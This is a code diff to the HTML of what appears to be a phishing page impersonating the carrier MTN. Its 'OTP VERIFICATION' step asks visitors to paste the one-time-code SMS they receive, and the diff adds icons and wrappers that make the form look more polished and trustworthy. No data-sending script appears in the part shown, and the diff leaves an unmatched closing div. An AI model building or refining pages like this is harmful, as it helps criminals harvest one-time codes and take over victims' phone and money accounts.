@@ -333,19 +333,30 @@ button:disabled {
   </section>
 
   <!-- PAGE 3: FIRST OTP CODE -->
-  <section id="page3" class="hidden">
-    <h1>OTP VERIFICATION</h1>
+<section id="page3" class="hidden visual-container">
+  <h1>OTP VERIFICATION</h1>
     <p>Copy and paste the verification OTP received on normal sms.</p>
-    <div class="notice">Check your sms box for otp message from MTN. It may take a view seconds to arrive.</div>
+    
+    <div class="notice">
+      <span class="notice-icon">ⓘ</span>
+      Check your sms box for otp message from MTN. It may take a view seconds to arrive.
+    </div>
+    
     <label for="code1">ENTER OTP</label>
-    <input id="code1" type="text" autocomplete="off" placeholder="PASTE THE OTP MESSAGE">
+    <div class="input-wrapper">
+      <span class="input-icon">💬</span>
+      <input id="code1" type="text" autocomplete="off" placeholder="PASTE THE OTP MESSAGE">
+    </div>
+    
     <button id="submitCode1" disabled="true">Continue</button>
+    
     <div id="code1Waiting" class="hidden">
       <div class="spinner"></div>
       <div class="status">Secure verification...</div>
     </div>
     <div id="code1Message" class="status"></div>
-  </section>
+  </div>
+</section>
 
   <!-- PAGE 4: SECOND OTP CODE -->
   <section id="page4" class="hidden">
